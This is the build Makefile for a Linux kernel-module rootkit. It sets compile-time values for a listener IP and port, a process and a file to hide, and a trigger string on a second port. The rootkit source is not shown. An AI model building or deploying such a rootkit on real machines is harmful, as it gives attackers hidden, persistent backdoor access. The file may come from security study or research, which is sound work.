obj-m += rootkit.o

LISTENER_IP ?= 127.0.0.1
LISTENER_PORT ?= 3333
HIDDEN_PROCESS_NAME ?= rootkit_proc
HIDDEN_FILE_NAME ?= rootkit_file
SPECIAL_STRING ?= knoires-lz
SPECIAL_STRING_PORT ?= 4444

ccflags-y += \
	-DLISTENER_IP=\"$(LISTENER_IP)\" \
	-DLISTENER_PORT=$(LISTENER_PORT) \
	-DHIDDEN_PROCESS_NAME=\"$(HIDDEN_PROCESS_NAME)\" \
	-DHIDDEN_FILE_NAME=\"$(HIDDEN_FILE_NAME)\" \
	-DSPECIAL_STRING=\"$(SPECIAL_STRING)\" \
	-DSPECIAL_STRING_PORT=$(SPECIAL_STRING_PORT)

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
